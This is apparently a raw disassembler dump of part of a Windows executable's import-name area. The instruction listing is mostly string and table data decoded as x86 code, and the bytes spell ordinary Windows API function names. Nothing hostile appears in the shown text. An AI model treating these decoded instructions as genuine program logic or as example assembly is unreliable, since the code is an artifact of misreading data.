  428806:	inc    esp
  428807:	gs push di
  42880a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428811:	outs   dx,DWORD PTR ds:[esi]
  428812:	arpl   WORD PTR [edi+0x0],dx
  428815:	add    BYTE PTR [ecx],dh
  428817:	add    BYTE PTR [ebx+0x68],al
  42881a:	popa   
  42881b:	jb     0x42886d
  42881d:	jb     0x428884
  42881f:	jbe    0x428878
  428821:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  428828:	fs popa 
  42882a:	je     0x428891
  42882c:	push   edx
  42882d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428832:	xor    eax,DWORD PTR [ecx]
  428834:	inc    edi
  428835:	gs je  0x428885
  428838:	outs   dx,BYTE PTR gs:[esi]
  42883a:	jne    0x428885
  42883c:	je     0x4288a3
  42883e:	ins    DWORD PTR es:[edi],dx
  42883f:	dec    ecx
  428840:	inc    esp
  428841:	add    BYTE PTR ds:0x6e655302,ch
  428847:	fs dec esi
  428849:	outs   dx,DWORD PTR ds:[esi]
  42884a:	je     0x4288b5
  42884c:	data16 jns 0x42889c
  42884f:	gs jae 0x4288c5
  428852:	popa   
  428853:	addr16 gs push edi
  428856:	add    BYTE PTR [eax],al
  428858:	mov    al,0x1
  42885a:	dec    esp
  42885b:	outs   dx,DWORD PTR ds:[esi]
  42885c:	popa   
  42885d:	fs dec ecx
  42885f:	arpl   WORD PTR [edi+0x6e],bp
  428862:	push   edi
  428863:	add    BYTE PTR [ecx+0x57734901],ah
  428869:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428870:	popa   
  428871:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428875:	add    BYTE PTR ds:0x74654701,dl
  42887b:	inc    esi
  42887c:	outs   dx,DWORD PTR ds:[esi]
  42887d:	jb     0x4288e4
  42887f:	addr16 jb 0x4288f1
  428882:	jne    0x4288f2
  428884:	fs push edi
  428886:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42888d:	add    DWORD PTR [edi+0x65],eax
  428890:	je     0x4288e9
  428892:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428899:	js     0x42890f
  42889b:	inc    ecx
  42889c:	add    BYTE PTR [eax],al
  42889e:	add    DWORD PTR ds:[edi+0x65],eax
  4288a2:	je     0x4288f1
  4288a4:	gs jae 0x42891a
  4288a7:	popa   
  4288a8:	addr16 gs push edi
  4288ab:	add    BYTE PTR [ebx],ch
  4288ad:	add    dl,BYTE PTR [ebx+0x65]
  4288b0:	outs   dx,BYTE PTR ds:[esi]
  4288b1:	fs dec ebp
  4288b3:	gs jae 0x428929
  4288b6:	popa   
  4288b7:	addr16 gs push edi
  4288ba:	add    BYTE PTR [eax],al
  4288bc:	das    
  4288bd:	add    dl,BYTE PTR [ebx+0x65]
  4288c0:	je     0x428903
  4288c2:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4288c6:	gs push edi
  4288c8:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  4288cf:	add    dl,BYTE PTR [edx+0x65]
  4288d2:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4288da:	popa   
  4288db:	jae    0x428950
  4288dd:	inc    ebp
  4288de:	js     0x428937
  4288e0:	add    BYTE PTR [eax],al
  4288e2:	and    DWORD PTR [edx],eax
  4288e4:	push   ebx
  4288e5:	outs   dx,BYTE PTR gs:[esi]
  4288e7:	fs inc esp
  4288e9:	ins    BYTE PTR es:[edi],dx
  4288ea:	addr16 dec ecx
  4288ec:	je     0x428953
  4288ee:	ins    DWORD PTR es:[edi],dx
  4288ef:	dec    ebp
  4288f0:	gs jae 0x428966
  4288f3:	popa   
  4288f4:	addr16 gs inc ecx
  4288f7:	add    BYTE PTR ds:0x74654701,bh
  4288fd:	dec    ebp
  4288fe:	gs jae 0x428974
  428901:	popa   
  428902:	addr16 gs push esp
  428905:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  42890c:	inc    ebx
  42890d:	popa   
  42890e:	jae    0x428973
  428910:	popa   
  428911:	fs gs push edi
  428914:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42891b:	add    bh,bl
  42891d:	add    BYTE PTR [ebp+0x78],al
  428920:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  428928:	jae    0x42896f
  42892a:	js     0x42892c
  42892c:	repnz add DWORD PTR [eax+0x6f],edx
  428930:	jae    0x4289a6
  428932:	dec    ebp
  428933:	gs jae 0x4289a9
  428936:	popa   
  428937:	addr16 gs push edi
  42893a:	add    BYTE PTR [eax],al
  42893c:	add    DWORD PTR fs:[edi+0x65],eax
  428940:	je     0x428997
  428942:	jo     0x4289a8
  428944:	popa   
  428945:	je     0x4289ac
  428947:	push   edx
  428948:	outs   dx,BYTE PTR ds:[si]
  42894a:	add    BYTE PTR [eax],al
  42894c:	mov    BYTE PTR [edx],al
  42894e:	push   esp
  42894f:	popa   
  428950:	bound  esp,QWORD PTR [edx+0x65]
  428953:	fs push esp
  428955:	gs js  0x4289cc
  428958:	dec    edi
  428959:	jne    0x4289cf
  42895b:	push   edi
  42895c:	add    BYTE PTR [eax],al
  42895e:	test   eax,0x616f4c01
  428963:	fs inc edx
  428965:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  42896d:	add    BYTE PTR [edx+esi*2+0x61],al
  428971:	ja     0x4289c6
  428973:	je     0x4289d6
  428975:	je     0x4289dc
  428977:	push   edi
  428978:	add    BYTE PTR [eax],al
  42897a:	ja     0x42897d
  42897c:	inc    edi
  42897d:	gs je  0x4289d7
  428980:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428987:	js     0x4289fd
  428989:	dec    esp
  42898a:	outs   dx,BYTE PTR gs:[esi]
  42898c:	addr16 je 0x4289f7
  42898f:	push   edi
  428990:	add    BYTE PTR [eax],al
  428992:	cmp    BYTE PTR [eax],al
  428994:	inc    ebx
  428995:	push   0x70557261
  42899a:	jo     0x428a01
  42899c:	jb     0x4289e0
  42899e:	jne    0x428a06
  4289a0:	push   di
  4289a2:	add    BYTE PTR [eax],al
  4289a4:	daa    
  4289a5:	add    DWORD PTR [edi+0x65],eax
  4289a8:	je     0x4289f5
  4289aa:	gs jns 0x428a0f
  4289ad:	outs   dx,DWORD PTR ds:[esi]
  4289ae:	popa   
  4289af:	jb     0x428a15
  4289b1:	push   esp
  4289b2:	jns    0x428a24
  4289b4:	add    BYTE PTR gs:[ebx+0x1],cl
  4289b8:	inc    edi
  4289b9:	gs je  0x428a0c
  4289bc:	jb     0x428a2d
  4289be:	jo     0x428a17
  4289c0:	add    BYTE PTR [eax],al
  4289c2:	dec    ebp
  4289c3:	add    BYTE PTR [ebx+0x6f],al
  4289c6:	jo     0x428a41
  4289c8:	push   edx
  4289c9:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4289ce:	sub    eax,0x61684300
  4289d3:	jb     0x428a23
  4289d5:	gs js  0x428a4c
  4289d8:	push   edi
  4289d9:	add    BYTE PTR [eax+0x43734901],dl
  4289df:	push   0x6f4c7261
  4289e4:	ja     0x428a4b
  4289e6:	jb     0x428a29
  4289e8:	add    BYTE PTR [eax],al
  4289ea:	sub    BYTE PTR [ecx],al
  4289ec:	inc    edi
  4289ed:	gs je  0x428a3c
  4289f0:	popa   
  4289f1:	jae    0x428a67
  4289f3:	inc    ecx
  4289f4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4289f8:	gs push eax
  4289fa:	outs   dx,DWORD PTR ds:[esi]
  4289fb:	jo     0x428a72
  4289fd:	jo     0x4289ff
  4289ff:	add    BYTE PTR [ebx+0x616f4c01],bh
  428a05:	fs push ebx
  428a07:	je     0x428a7b
  428a09:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  428a10:	inc    edi
  428a11:	gs je  0x428a6b
  428a14:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  428a1b:	outs   dx,BYTE PTR ds:[esi]
  428a1c:	addr16 push edi
  428a1e:	add    BYTE PTR [eax],al
  428a20:	leave  
  428a21:	add    DWORD PTR [ebp+0x61],ecx
  428a24:	jo     0x428a7d
  428a26:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  428a2d:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  428a34:	inc    ebx
  428a35:	push   0x6f547261
  428a3a:	dec    edi
  428a3b:	gs ins DWORD PTR es:[edi],dx
  428a3d:	push   edi
  428a3e:	add    BYTE PTR [eax],al
  428a40:	push   ebp
  428a41:	push   ebx
  428a42:	inc    ebp
  428a43:	push   edx
  428a44:	xor    esi,DWORD PTR [edx]
  428a46:	cs fs ins BYTE PTR es:[edi],dx
  428a49:	ins    BYTE PTR es:[edi],dx
  428a4a:	add    BYTE PTR [eax],al
  428a4c:	xchg   edx,eax
  428a4d:	add    edx,DWORD PTR [edx+0x74]
  428a50:	ins    BYTE PTR es:[edi],dx
  428a51:	dec    ecx
  428a52:	outs   dx,BYTE PTR ds:[esi]
  428a53:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  428a5b:	jb     0x428ac6
  428a5d:	outs   dx,BYTE PTR ds:[esi]
  428a5e:	add    BYTE PTR [bp+0x74],ch
  428a62:	fs ins BYTE PTR es:[edi],dx
  428a64:	ins    BYTE PTR es:[edi],dx
  428a65:	cs fs ins BYTE PTR es:[edi],dx
  428a68:	ins    BYTE PTR es:[edi],dx
  428a69:	add    BYTE PTR ds:0x74654702,al
  428a6f:	dec    esp
  428a70:	outs   dx,DWORD PTR ds:[esi]
  428a71:	arpl   WORD PTR [ecx+0x6c],sp
  428a74:	gs dec ecx
  428a76:	outs   dx,BYTE PTR ds:[esi]
  428a77:	outs   dx,WORD PTR ds:[esi]
  428a79:	push   edi
  428a7a:	add    BYTE PTR [eax],al
  428a7c:	inc    ebp
  428a7d:	add    al,BYTE PTR [edi+0x65]
  428a80:	je     0x428ad2
  428a82:	jb     0x428af3
  428a84:	arpl   WORD PTR [ecx+0x64],ax
  428a87:	fs jb  0x428aef
  428a8a:	jae    0x428aff
  428a8c:	add    BYTE PTR [eax],al
  428a8e:	rol    DWORD PTR [eax],cl
  428a90:	inc    ebx
  428a91:	jb     0x428af8
  428a93:	popa   
  428a94:	je     0x428afb
  428a96:	inc    esi
  428a97:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a9f:	outs   dx,BYTE PTR ds:[esi]
  428aa0:	addr16 push edi
  428aa2:	add    BYTE PTR [eax],al
  428aa4:	sub    BYTE PTR [ebx+edx*2],al
  428aa7:	gs je  0x428af2
  428aaa:	popa   
  428aab:	outs   dx,BYTE PTR ds:[esi]
  428aac:	fs ins BYTE PTR es:[edi],dx
  428aae:	gs inc ebx
  428ab0:	outs   dx,DWORD PTR ds:[esi]
  428ab1:	jne    0x428b21
  428ab3:	je     0x428ab5
  428ab5:	add    ah,bl
  428ab7:	add    BYTE PTR [ebx+0x72],al
  428aba:	gs popa 
  428abc:	je     0x428b23
  428abe:	dec    ebp
  428abf:	popa   
  428ac0:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428ac8:	pop    DWORD PTR [ecx]
  428aca:	inc    edi
  428acb:	gs je  0x428b0f
  428ace:	je     0x428b3f
  428ad0:	ins    DWORD PTR es:[edi],dx
  428ad1:	dec    esi
  428ad2:	popa   
  428ad3:	ins    DWORD PTR es:[edi],dx
  428ad4:	gs inc ecx
  428ad6:	add    BYTE PTR [eax],al
  428ad8:	pusha  
  428ad9:	add    al,BYTE PTR [edi+0x65]
  428adc:	je     0x428b31
  428ade:	jns    0x428b53
  428ae0:	je     0x428b47
  428ae2:	ins    DWORD PTR es:[edi],dx
  428ae3:	push   edi
  428ae4:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428aeb:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428af2:	jns    0x428b35
  428af4:	add    BYTE PTR [eax],al
  428af6:	aas    
  428af7:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428afb:	fs dec esp
  428afd:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428b04:	add    BYTE PTR [eax],al
  428b06:	xchg   ecx,eax
  428b07:	add    al,BYTE PTR [edi+0x6c]
  428b0a:	outs   dx,DWORD PTR ds:[esi]
  428b0b:	bound  esp,QWORD PTR [ecx+0x6c]
  428b0e:	inc    ecx
  428b0f:	ins    BYTE PTR es:[edi],dx
  428b10:	ins    BYTE PTR es:[edi],dx
  428b11:	outs   dx,DWORD PTR ds:[esi]
  428b12:	arpl   WORD PTR [eax],ax
  428b14:	xchg   edx,eax
  428b15:	add    al,0x56
  428b17:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428b1e:	jne    0x428b85
  428b20:	jb     0x428b9b
  428b22:	add    BYTE PTR [eax],al
  428b24:	test   DWORD PTR [ecx],0x46746547
  428b2a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428b32:	jb     0x428b35
  428b34:	inc    esi
  428b35:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428b3c:	jne    0x428bb0
  428b3e:	arpl   WORD PTR [ebp+0x57],sp
  428b41:	add    BYTE PTR [eax],bh
  428b43:	add    ecx,DWORD PTR [ebp+0x6f]
  428b46:	jbe    0x428bad
  428b48:	inc    esi
  428b49:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428b51:	popa   
  428b52:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428b59:	jo     0x428bcf
  428b5b:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428b62:	inc    edi
  428b63:	gs je  0x428ba8
  428b66:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428b6d:	jo     0x428bd4
  428b6f:	inc    ecx
  428b70:	add    BYTE PTR [eax],al
  428b72:	and    DWORD PTR [ebx+edx*2],eax
  428b75:	gs je  0x428bbe
  428b78:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b80:	bound  esi,QWORD PTR [ebp+0x74]
  428b83:	gs jae 0x428bc7
  428b86:	add    BYTE PTR [eax],al
  428b88:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b8c:	jbe    0x428bf3
  428b8e:	inc    esi
  428b8f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b97:	add    BYTE PTR [ebx+0x6f],al
  428b9a:	jo     0x428c15
  428b9c:	inc    esi
  428b9d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428ba5:	jne    0x428c0c
  428ba7:	jb     0x428c22
  428ba9:	push   eax
  428baa:	gs jb  0x428c13
  428bad:	outs   dx,DWORD PTR ds:[esi]
  428bae:	jb     0x428c1d
  428bb0:	popa   
  428bb1:	outs   dx,BYTE PTR ds:[esi]
  428bb2:	arpl   WORD PTR [ebp+0x43],sp
  428bb5:	outs   dx,DWORD PTR ds:[esi]
  428bb6:	jne    0x428c26
  428bb8:	je     0x428c1f
  428bba:	jb     0x428bbc
  428bbc:	sub    DWORD PTR [ebx+edx*2],eax
  428bbf:	gs je  0x428c0a
  428bc2:	popa   
  428bc3:	outs   dx,BYTE PTR ds:[esi]
  428bc4:	fs ins BYTE PTR es:[edi],dx
  428bc6:	gs dec ecx
  428bc8:	outs   dx,BYTE PTR ds:[esi]
  428bc9:	outs   dx,WORD PTR ds:[esi]
  428bcb:	jb     0x428c3a
  428bcd:	popa   
  428bce:	je     0x428c39
  428bd0:	outs   dx,DWORD PTR ds:[esi]
  428bd1:	outs   dx,BYTE PTR ds:[esi]
  428bd2:	add    BYTE PTR [eax],al
  428bd4:	push   ss
  428bd5:	add    DWORD PTR [ebp+0x6e],eax
  428bd8:	je     0x428c3f
  428bda:	jb     0x428c1f
  428bdc:	jb     0x428c47
  428bde:	je     0x428c49
  428be0:	arpl   WORD PTR [ecx+0x6c],sp
  428be3:	push   ebx
  428be4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428be9:	outs   dx,BYTE PTR ds:[esi]
  428bea:	add    BYTE PTR [eax],al
  428bec:	jg     0x428bef
  428bee:	inc    esi
  428bef:	outs   dx,DWORD PTR ds:[esi]
  428bf0:	ins    BYTE PTR es:[edi],dx
  428bf1:	fs push ebx
  428bf3:	je     0x428c67
  428bf5:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428bfc:	ins    BYTE PTR es:[edi],dx
  428bfd:	jae    0x428c73
  428bff:	jb     0x428c6d
  428c01:	outs   dx,BYTE PTR gs:[esi]
  428c03:	inc    ecx
  428c04:	add    BYTE PTR [eax],al
  428c06:	sahf   
  428c07:	add    DWORD PTR [edi+0x65],eax
  428c0a:	je     0x428c4f
  428c0c:	outs   dx,DWORD PTR ds:[esi]
  428c0d:	ins    DWORD PTR es:[edi],dx
  428c0e:	ins    DWORD PTR es:[edi],dx
  428c0f:	push   esp
  428c10:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428c17:	add    BYTE PTR [edx+eax*1+0x47],dh
  428c1b:	gs je  0x428c72
  428c1e:	push   0x64616572
  428c23:	push   esp
  428c24:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428c2b:	inc    ebp
  428c2c:	push   edx
  428c2d:	dec    esi
  428c2e:	inc    ebp
  428c2f:	dec    esp
  428c30:	xor    esi,DWORD PTR [edx]
  428c32:	cs fs ins BYTE PTR es:[edi],dx
  428c35:	ins    BYTE PTR es:[edi],dx
  428c36:	add    BYTE PTR [eax],al
  428c38:	mov    dh,0x1
  428c3a:	push   eax
  428c3b:	outs   dx,DWORD PTR ds:[esi]
  428c3c:	ins    BYTE PTR es:[edi],dx
  428c3d:	jns    0x428ca6
  428c3f:	outs   dx,DWORD PTR ds:[esi]
  428c40:	outs   dx,BYTE PTR ds:[esi]
  428c41:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428c45:	gs je  0x428c97
  428c48:	bound  ebp,QWORD PTR [edx+0x65]
  428c4b:	arpl   WORD PTR [edi+edx*2+0x0],si
  428c4f:	add    BYTE PTR [ebx+0x6c654400],dh
  428c55:	gs je  0x428cbd
  428c58:	inc    esp
  428c59:	inc    ebx
  428c5a:	add    BYTE PTR [eax],al
  428c5c:	rol    DWORD PTR [ecx],1
  428c5e:	push   ebx
  428c5f:	gs ins BYTE PTR es:[edi],dx
  428c61:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428c66:	push   0x65
  428c68:	arpl   WORD PTR [eax+eax*1+0x0],si
  428c6c:	jmp    0x428c6f
  428c6e:	push   ebx
  428c6f:	gs je  0x428cbf
  428c72:	popa   
  428c73:	jo     0x428cc2
  428c75:	outs   dx,DWORD PTR ds:[esi]
  428c76:	fs add BYTE PTR gs:[eax],al
  428c7a:	leave  
  428c7b:	add    DWORD PTR [edx+0x6f],edx
  428c7e:	jne    0x428cee
  428c80:	fs push edx
  428c82:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c87:	add    BYTE PTR [edx+0x69],al
  428c8a:	je     0x428cce
  428c8c:	ins    BYTE PTR es:[edi],dx
  428c8d:	je     0x428c8f
  428c8f:	add    BYTE PTR [ebx+0x61655201],bh
  428c95:	ins    BYTE PTR es:[edi],dx
  428c96:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c9d:	je     0x428d13
  428c9f:	add    BYTE PTR gs:[eax],al
  428ca2:	jge    0x428ca5
  428ca4:	inc    edi
  428ca5:	gs je  0x428cfb
  428ca8:	jns    0x428d1d
  428caa:	je     0x428d11
  428cac:	ins    DWORD PTR es:[edi],dx
  428cad:	push   eax
  428cae:	popa   
  428caf:	ins    BYTE PTR es:[edi],dx
  428cb0:	gs je  0x428d27
  428cb3:	gs push ebp
  428cb5:	jae    0x428d1c
  428cb7:	add    BYTE PTR [eax+0x74654701],cl
  428cbd:	push   esp
  428cbe:	gs js  0x428d35
  428cc1:	inc    ebp
  428cc2:	js     0x428d38
  428cc4:	outs   dx,BYTE PTR gs:[esi]
  428cc6:	je     0x428d18
  428cc8:	outs   dx,DWORD PTR ds:[esi]
  428cc9:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428cd0:	push   ebx
  428cd1:	arpl   WORD PTR [ecx+0x6c],sp
  428cd4:	gs push esi
  428cd6:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428cdd:	inc    ebp
  428cde:	js     0x428d54
  428ce0:	inc    ebp
  428ce1:	js     0x428ce3
  428ce3:	add    bh,cl
  428ce5:	add    DWORD PTR [ebx+0x65],edx
  428ce8:	ins    BYTE PTR es:[edi],dx
  428ce9:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428cee:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428cf5:	add    DWORD PTR [ebx+0x65],edx
  428cf8:	je     0x428d4e
  428cfa:	gs js  0x428d71
  428cfd:	inc    ebx
  428cfe:	outs   dx,DWORD PTR ds:[esi]
  428cff:	ins    BYTE PTR es:[edi],dx
  428d00:	outs   dx,DWORD PTR ds:[esi]
  428d01:	jb     0x428d03
  428d03:	add    BYTE PTR [eax+0x74615001],ch
  428d09:	push   0x65526f54
  428d0e:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428d16:	inc    ebx
  428d17:	outs   dx,DWORD PTR ds:[esi]
  428d18:	ins    DWORD PTR es:[edi],dx
  428d19:	bound  ebp,QWORD PTR [ecx+0x6e]
  428d1c:	gs push edx
  428d1e:	outs   dx,BYTE PTR ds:[si]
  428d20:	add    BYTE PTR [eax],al
  428d22:	lods   al,BYTE PTR ds:[esi]
  428d23:	add    BYTE PTR [ebx+0x72],al
  428d26:	gs popa 
  428d28:	je     0x428d8f
  428d2a:	push   edx
  428d2b:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428d30:	outs   dx,BYTE PTR ds:[esi]
  428d31:	dec    ecx
  428d32:	outs   dx,BYTE PTR ds:[esi]
  428d33:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428d3b:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428d3f:	gs push esp
  428d41:	outs   dx,DWORD PTR ds:[esi]
  428d42:	add    BYTE PTR [eax],al
  428d44:	mov    ds:0x65724300,al
  428d49:	popa   
  428d4a:	je     0x428db1
  428d4c:	dec    ecx
  428d4d:	inc    ebx
  428d4e:	push   edi
  428d4f:	add    BYTE PTR [ebp+0x63655201],bh
  428d55:	je     0x428dad
  428d57:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d5f:	add    BYTE PTR [ebx+0x72],al
  428d62:	gs popa 
  428d64:	je     0x428dcb
  428d66:	push   eax
  428d67:	popa   
  428d68:	ins    BYTE PTR es:[edi],dx
  428d69:	gs je  0x428de0
  428d6c:	add    BYTE PTR gs:[edi+0x44],al
  428d70:	dec    ecx
  428d71:	xor    esi,DWORD PTR [edx]
  428d73:	cs fs ins BYTE PTR es:[edi],dx
  428d76:	ins    BYTE PTR es:[edi],dx
	...
  428d7f:	add    BYTE PTR [esi+0x220],bh
	...
  428d9d:	add    BYTE PTR [eax],al
  428d9f:	add    BYTE PTR [ebx+0x28d],bh
	...
  428dad:	add    BYTE PTR [eax],al
  428daf:	add    BYTE PTR [ecx+0x64],ch
  428db2:	js     0x428e1d
  428db4:	outs   dx,DWORD PTR fs:[esi]
  428db6:	arpl   WORD PTR cs:[edi+0x6d],bp
  428dba:	add    BYTE PTR [ebx+0x65],dl
  428dbd:	je     0x428e00
  428dbf:	outs   dx,BYTE PTR ds:[esi]
  428dc0:	arpl   WORD PTR [eax+0x6f],bp
  428dc3:	jb     0x428e14
  428dc5:	jb     0x428e30
  428dc7:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428dcf:	add    BYTE PTR [eax],al
  428dd1:	add    BYTE PTR [eax],al
  428dd3:	add    BYTE PTR [eax-0x7a],cl
  428dd6:	add    al,BYTE PTR [eax]
  428dd8:	xchg   BYTE PTR fs:[edx],al
  428ddb:	add    BYTE PTR [esi-0x7a],dh
  428dde:	add    al,BYTE PTR [eax]
  428de0:	mov    BYTE PTR [esi-0x795ffffe],al
  428de6:	add    al,BYTE PTR [eax]
  428de8:	mov    ah,0x86
  428dea:	add    al,BYTE PTR [eax]
  428dec:	into   
  428ded:	xchg   BYTE PTR [edx],al
  428def:	add    BYTE PTR [eax],al
  428df1:	add    BYTE PTR [eax],al
  428df3:	add    al,dh
  428df5:	xchg   BYTE PTR [edx],al
  428df7:	add    BYTE PTR [esi],cl
  428df9:	xchg   DWORD PTR [edx],eax
  428dfb:	add    BYTE PTR [edi+eax*4],bl
  428dfe:	add    al,BYTE PTR [eax]
  428e00:	sub    al,BYTE PTR [edi-0x78c1fffe]
  428e06:	add    al,BYTE PTR [eax]
  428e08:	dec    esp
  428e09:	xchg   DWORD PTR [edx],eax
  428e0b:	add    BYTE PTR [esi-0x79],bl
  428e0e:	add    al,BYTE PTR [eax]
  428e10:	jo     0x428d99
  428e12:	add    al,BYTE PTR [eax]
  428e14:	jle    0x428d9d
  428e16:	add    al,BYTE PTR [eax]
  428e18:	nop
  428e19:	xchg   DWORD PTR [edx],eax
  428e1b:	add    BYTE PTR [edx-0x4ffffd79],ah
  428e21:	xchg   DWORD PTR [edx],eax
  428e23:	add    BYTE PTR [esi-0x2ffffd79],bh
  428e29:	xchg   DWORD PTR [edx],eax
  428e2b:	add    ah,bl
  428e2d:	xchg   DWORD PTR [edx],eax
  428e2f:	add    dl,dh
  428e31:	xchg   DWORD PTR [edx],eax
  428e33:	add    BYTE PTR [eax+ecx*4],al
  428e36:	add    al,BYTE PTR [eax]
  428e38:	push   ss
  428e39:	mov    BYTE PTR [edx],al
  428e3b:	add    BYTE PTR [edx],ah
  428e3d:	mov    BYTE PTR [edx],al
  428e3f:	add    BYTE PTR [edx],dh
  428e41:	mov    BYTE PTR [edx],al
  428e43:	add    BYTE PTR [edx-0x78],al
  428e46:	add    al,BYTE PTR [eax]
  428e48:	pop    eax
  428e49:	mov    BYTE PTR [edx],al
  428e4b:	add    BYTE PTR [eax+ecx*4+0x2],ah
  428e4f:	add    BYTE PTR [esi-0x78],dh
  428e52:	add    al,BYTE PTR [eax]
  428e54:	mov    WORD PTR [eax-0x7761fffe],cs
  428e5a:	add    al,BYTE PTR [eax]
  428e5c:	lods   al,BYTE PTR ds:[esi]
  428e5d:	mov    BYTE PTR [edx],al
  428e5f:	add    BYTE PTR [eax+ecx*4-0x7731fffe],bh
  428e66:	add    al,BYTE PTR [eax]
  428e68:	loop   0x428df2
  428e6a:	add    al,BYTE PTR [eax]
  428e6c:	clc    
  428e6d:	mov    BYTE PTR [edx],al
  428e6f:	add    BYTE PTR [edx],cl
  428e71:	mov    DWORD PTR [edx],eax
  428e73:	add    BYTE PTR [ecx+ecx*4],bl
  428e76:	add    al,BYTE PTR [eax]
  428e78:	sub    al,0x89
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	cmp    al,0x89
  428e7e:	add    al,BYTE PTR [eax]
  428e80:	dec    esp
  428e81:	mov    DWORD PTR [edx],eax
  428e83:	add    BYTE PTR [esi-0x77],bl
  428e86:	add    al,BYTE PTR [eax]
  428e88:	ins    BYTE PTR es:[edi],dx
  428e89:	mov    DWORD PTR [edx],eax
  428e8b:	add    BYTE PTR [edx-0x77],bh
  428e8e:	add    al,BYTE PTR [eax]
  428e90:	xchg   edx,eax
  428e91:	mov    DWORD PTR [edx],eax
  428e93:	add    BYTE PTR [ecx+ecx*4-0x7649fffe],ah
  428e9a:	add    al,BYTE PTR [eax]
  428e9c:	ret    0x289
  428e9f:	add    dh,cl
  428ea1:	mov    DWORD PTR [edx],eax
  428ea3:	add    dl,bl
  428ea5:	mov    DWORD PTR [edx],eax
  428ea7:	add    dl,ch
  428ea9:	mov    DWORD PTR [edx],eax
  428eab:	add    BYTE PTR [eax],al
  428ead:	mov    al,BYTE PTR [edx]
  428eaf:	add    BYTE PTR [esi],cl
  428eb1:	mov    al,BYTE PTR [edx]
  428eb3:	add    BYTE PTR [eax],ah
  428eb5:	mov    al,BYTE PTR [edx]
  428eb7:	add    BYTE PTR [edx],dh
  428eb9:	mov    al,BYTE PTR [edx]
  428ebb:	add    BYTE PTR [eax],al
  428ebd:	add    BYTE PTR [eax],al
  428ebf:	add    BYTE PTR [edx+ecx*4+0x2],cl
  428ec3:	add    BYTE PTR [eax],al
  428ec5:	add    BYTE PTR [eax],al
  428ec7:	add    BYTE PTR [edx-0x76],ch
  428eca:	add    al,BYTE PTR [eax]
  428ecc:	jl     0x428e58
  428ece:	add    al,BYTE PTR [eax]
  428ed0:	mov    cs,WORD PTR [edx-0x755bfffe]
  428ed6:	add    al,BYTE PTR [eax]
  428ed8:	mov    dh,0x8a
  428eda:	add    al,BYTE PTR [eax]
  428edc:	enter  0x28a,0x0
  428ee0:	fmul   DWORD PTR [edx-0x7509fffe]
  428ee6:	add    al,BYTE PTR [eax]
  428ee8:	push   es
  428ee9:	mov    eax,DWORD PTR [edx]
  428eeb:	add    BYTE PTR [ebx+ecx*4],dl
  428eee:	add    al,BYTE PTR [eax]
  428ef0:	and    al,0x8b
  428ef2:	add    al,BYTE PTR [eax]
  428ef4:	xor    cl,BYTE PTR [ebx-0x74bdfffe]
  428efa:	add    al,BYTE PTR [eax]
  428efc:	dec    esi
  428efd:	mov    eax,DWORD PTR [edx]
  428eff:	add    BYTE PTR [eax-0x75],ah
  428f02:	add    al,BYTE PTR [eax]
  428f04:	jb     0x428e91
  428f06:	add    al,BYTE PTR [eax]
  428f08:	mov    BYTE PTR [ebx-0x7469fffe],cl
  428f0e:	add    al,BYTE PTR [eax]
